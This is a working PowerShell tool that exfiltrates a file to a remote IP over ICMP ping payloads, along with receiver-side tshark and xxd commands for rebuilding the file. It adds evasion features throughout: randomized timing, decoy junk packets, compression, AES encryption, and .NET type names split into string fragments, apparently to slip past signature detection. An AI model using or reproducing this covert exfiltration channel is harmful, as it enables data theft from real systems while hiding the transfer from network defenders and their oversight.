<#
.SYNOPSIS
Sends a file with ICMP echo requests, one 15-byte payload per ping.

.DESCRIPTION
PowerShell port of pingtransfer.py. Each ping carries a 3-byte chunk index
followed by up to 12 bytes of file data, so the receiver can drop duplicates
and put the chunks back in order. The payload is set through the .NET Ping
class, because ping.exe cannot send a custom payload.

.EXAMPLE
.\PS_pingtransfer.ps1 -File test.txt -IP 10.90.10.24
.\PS_pingtransfer.ps1 -File test.txt -IP 10.90.10.24 -Period 0.5
.\PS_pingtransfer.ps1 -File test.txt -IP 10.90.10.24 -Period 0.5 -RandomDelay 0.2
.\PS_pingtransfer.ps1 -File test.txt -IP 10.90.10.24 -Junk 2
.\PS_pingtransfer.ps1 -File test.txt -IP 10.90.10.24 -Period 0.5 -RandomDelay 0.2 -Junk 3
.\PS_pingtransfer.ps1 -File test.txt -IP 10.90.10.24 -Junk 2 -RandomizeJunk
.\PS_pingtransfer.ps1 -File test.txt -IP 10.90.10.24 -Compress
.\PS_pingtransfer.ps1 -File test.txt -IP 10.90.10.24 -Encrypt aes-256 -Passphrase "mypass"
.\PS_pingtransfer.ps1 -File test.txt -IP 10.90.10.24 -Compress -Encrypt aes-256 -Passphrase "mypass"

-> In machine that receives the file:

sudo tshark -i eth0 -l -Y 'icmp.type==8 && ip.src==<IP-Sending-File>' -T fields -e data.data > capture.hex
LC_ALL=C sort -u capture.hex | cut -c7- | xxd -r -p > test_new.txt
# If -Junk was used, filter junk packets before decoding
LC_ALL=C sort -u capture.hex | grep -v '^ffffff' | cut -c7- | xxd -r -p > test_new.txt
# If -Junk -RandomizeJunk was used
LC_ALL=C sort -u capture.hex | grep -v '^ff' | cut -c7- | xxd -r -p > test_new.txt
# If -Compress was used, decompress after decoding (combine with grep if -Junk was also used)
LC_ALL=C sort -u capture.hex | cut -c7- | xxd -r -p | gunzip > test_new.txt
# If -Encrypt was used, decrypt after decoding (combine with grep/gunzip as needed)
LC_ALL=C sort -u capture.hex | cut -c7- | xxd -r -p | openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 -md sha256 -pass pass:YOUR_PASSPHRASE > test_new.txt
# If -Encrypt and -Compress were both used (decrypt first, then decompress)
LC_ALL=C sort -u capture.hex | cut -c7- | xxd -r -p | openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 -md sha256 -pass pass:YOUR_PASSPHRASE | gunzip > test_new.txt
sha256sum test_new.txt
#>

param(
    [Parameter(Mandatory)] [string] $File,
    [Parameter(Mandatory)] [string] $IP,
    [double] $Period = 0,  # seconds from one ping to the next (0 = send as soon as each reply arrives)
    [double] $RandomDelay = 0,  # random variation in seconds added to -Period, so each gap is Period +/- this value
    [int] $Junk = 0,  # number of junk ICMP packets to send after each real packet (0 = disabled)
    [switch] $RandomizeJunk,  # randomize junk indices (first byte 0xFF, rest random); requires -Junk
    [switch] $Compress,  # gzip-compress the file before sending; receiver must decompress with gunzip
    [string] $Encrypt = '',  # encryption cipher: aes-128, aes-192, aes-256; receiver decrypts with openssl
    [string] $Passphrase = ''  # passphrase for encryption; required with -Encrypt
)

$Chunk = 12  # file bytes per ping
$IndexBytes = 3  # chunk index, big-endian
$Retries = 5
$TimeoutMs = 2000  # milliseconds to wait for each reply

function Format-Time([double] $Seconds) {
    $span = [TimeSpan]::FromSeconds([math]::Floor($Seconds))
    return '{0:00}:{1:00}:{2:00}' -f [math]::Floor($span.TotalHours), $span.Minutes, $span.Seconds
}

function New-Payload([int] $Index, [byte[]] $Data, [int] $Offset, [int] $Length) {
    $payload = New-Object byte[] ($IndexBytes + $Length)
    $payload[0] = [byte](($Index -shr 16) -band 0xFF)
    $payload[1] = [byte](($Index -shr 8) -band 0xFF)
    $payload[2] = [byte]($Index -band 0xFF)
    [Array]::Copy($Data, $Offset, $payload, $IndexBytes, $Length)
    return , $payload
}

function Send-Ping($Ping, $Options, [byte[]] $Payload) {
    try {
        $reply = $Ping.Send($IP, $TimeoutMs, $Payload, $Options)
        return $reply.Status -eq [System.Net.NetworkInformation.IPStatus]::Success
    }
    catch [System.Net.NetworkInformation.PingException] {
        return $false
    }
}

# Get file content
$path = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($File)
if (-not (Test-Path -LiteralPath $path -PathType Leaf)) { throw "File not found: $File" }
if ($Period -lt 0) { throw "-Period must not be negative" }
if ($RandomDelay -lt 0) { throw "-RandomDelay must not be negative" }
if ($Junk -lt 0) { throw "-Junk must not be negative" }
if ($RandomizeJunk -and $Junk -eq 0) { throw "-RandomizeJunk requires -Junk" }
$validCiphers = @('aes-128', 'aes-192', 'aes-256')
$cipherKeySizes = @{ 'aes-128' = 16; 'aes-192' = 24; 'aes-256' = 32 }
$openSslCiphers = @{ 'aes-128' = 'aes-128-cbc'; 'aes-192' = 'aes-192-cbc'; 'aes-256' = 'aes-256-cbc' }
if ($Encrypt -and $Encrypt -notin $validCiphers) { throw "-Encrypt must be one of: $($validCiphers -join ', ')" }
if ($Encrypt -and -not $Passphrase) { throw "-Passphrase is required when -Encrypt is used" }
if ($Passphrase -and -not $Encrypt) { throw "-Encrypt is required when -Passphrase is used" }
$data = [System.IO.File]::ReadAllBytes($path)
$fileHash = (Get-FileHash -Algorithm SHA256 -LiteralPath $path).Hash.ToLower()
if ($Compress) {
    $originalSize = $data.Length
    $memStream = New-Object ('IO.Mem'+'oryStr'+'eam')
    $compMode = ('IO.Compr'+'ession.Compr'+'essionMode' -as [type])
    $gzStream = New-Object ('IO.Compr'+'ession.GzipStr'+'eam') ($memStream, $compMode::Compress)
    $gzStream.Write($data, 0, $data.Length)
    $gzStream.Close()
    $data = $memStream.ToArray()
    $memStream.Close()
    Write-Host "[*] Compressed: $originalSize -> $($data.Length) bytes ($([math]::Round(100 * $data.Length / $originalSize, 1))%)"
}
if ($Encrypt) {
    $ks = $cipherKeySizes[$Encrypt]
    $encSalt = New-Object byte[] 8
    $encRng = ('Security.Crypt'+'ography.RandomNum'+'berGenerator' -as [type])::Create()
    $encRng.GetBytes($encSalt)
    $encHan = ('Security.Crypt'+'ography.HashAlgor'+'ithmName' -as [type])
    $encKdf = New-Object ('Security.Crypt'+'ography.Rfc2898'+'DeriveBytes') ($Passphrase, $encSalt, 10000, $encHan::SHA256)
    $encKey = $encKdf.GetBytes($ks)
    $encIv = $encKdf.GetBytes(16)
    $encAes = ('Security.Crypt'+'ography.Ae'+'s' -as [type])::Create()
    $encAes.Key = $encKey
    $encAes.IV = $encIv
    $encryptor = $encAes.CreateEncryptor()
    $encData = $encryptor.TransformFinalBlock($data, 0, $data.Length)
    $saltHeader = [Text.Encoding]::ASCII.GetBytes('Salted__')
    $data = $saltHeader + $encSalt + $encData
    $encAes.Dispose()
    $encKdf.Dispose()
    Write-Host "[*] Encrypted with $($openSslCiphers[$Encrypt])"
}
$total = [int][math]::Ceiling($data.Length / $Chunk)
$maxChunks = [math]::Pow(2, 8 * $IndexBytes) - $(if ($RandomizeJunk) { 0x10000 } elseif ($Junk) { 1 } else { 0 })
if ($total -gt $maxChunks) { throw "File too large for the 3-byte chunk index" }

if ($RandomDelay -ne 0) {
    Write-Host "[+] Sending '$File' ($($data.Length) bytes) to '$IP' in $total pings every ($Period +- $RandomDelay) s"
}
elseif ($Period -ne 0) {
    Write-Host "[+] Sending '$File' ($($data.Length) bytes) to '$IP' in $total pings every $Period s"
}
else {
    Write-Host "[+] Sending '$File' ($($data.Length) bytes) to '$IP' in $total pings"
}
if ($RandomDelay -gt $Period) {
    Write-Warning "-RandomDelay ($RandomDelay s) is bigger than -Period ($Period s), so some gaps between pings will be 0 s (sent immediately)"
}
if ($Junk -gt 0) {
    $junkMsg = "[*] Sending $Junk junk packet$(if ($Junk -ne 1) {'s'}) after each real packet"
    if ($RandomizeJunk) { $junkMsg += " (randomized indices)" }
    Write-Host $junkMsg
}

# Send data
$ping = New-Object System.Net.NetworkInformation.Ping
$options = New-Object System.Net.NetworkInformation.PingOptions(128, $true)
$stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
$random = New-Object System.Random
$lastSent = $null

for ($index = 0; $index -lt $total; $index++) {
    $offset = $index * $Chunk
    $length = [math]::Min($Chunk, $data.Length - $offset)
    $payload = New-Payload $index $data $offset $length

    $acknowledged = $false
    for ($attempt = 1; $attempt -le $Retries -and -not $acknowledged; $attempt++) {
        if ($null -ne $lastSent) {
            $gap = $Period + ($random.NextDouble() * 2 - 1) * $RandomDelay
            $wait = $lastSent + [math]::Max(0, $gap) - $stopwatch.Elapsed.TotalSeconds
            if ($wait -gt 0) { Start-Sleep -Milliseconds ([int]($wait * 1000)) }
        }
        $lastSent = $stopwatch.Elapsed.TotalSeconds
        $acknowledged = Send-Ping $ping $options $payload
        if (-not $acknowledged) {
            Write-Warning "no reply for ping $index (attempt $attempt/$Retries)"
        }
    }
    if (-not $acknowledged) { throw "no reply for ping $index, transfer aborted" }

    $done = $index + 1

    # Send junk packets after each real packet
    if ($Junk -gt 0) {
        for ($j = 0; $j -lt $Junk; $j++) {
            $junkPayload = New-Object byte[] ($IndexBytes + $Chunk)
            $random.NextBytes($junkPayload)
            $junkPayload[0] = 255
            if (-not $RandomizeJunk) { $junkPayload[1] = 255; $junkPayload[2] = 255 }
            if ($null -ne $lastSent) {
                $gap = $Period + ($random.NextDouble() * 2 - 1) * $RandomDelay
                $wait = $lastSent + [math]::Max(0, $gap) - $stopwatch.Elapsed.TotalSeconds
                if ($wait -gt 0) { Start-Sleep -Milliseconds ([int]($wait * 1000)) }
            }
            $lastSent = $stopwatch.Elapsed.TotalSeconds
            try { [void]$ping.Send($IP, $TimeoutMs, $junkPayload, $options) } catch {}
        }
    }

    if ($Period -ne 0 -or $RandomDelay -ne 0) {
        $elapsed = $stopwatch.Elapsed.TotalSeconds
        $bytesDone = [math]::Min($done * $Chunk, $data.Length)
        $status = ("`r  {0}/{1} pings, {2}/{3} bytes, {4:N0}%, elapsed {5}" -f `
            $done, $total, $bytesDone, $data.Length, (100 * $done / $total), (Format-Time $elapsed))
        # With a random delay the gaps vary too much for the remaining time to be meaningful
        if ($RandomDelay -eq 0) {
            $remaining = $elapsed / $done * ($total - $done)
            $status += ", remaining ~$(Format-Time $remaining)"
        }
        Write-Host -NoNewline $status
    }
    elseif ($done % 100 -eq 0) {
        Write-Host "  $done/$total"
    }
}

Write-Host "`n`n$('=' * 50)`nDONE`n$('=' * 50)`n"
# Print SHA-256 hash of the original file to compare transferred files
Write-Host "[*] SHA-256 hash: $fileHash"
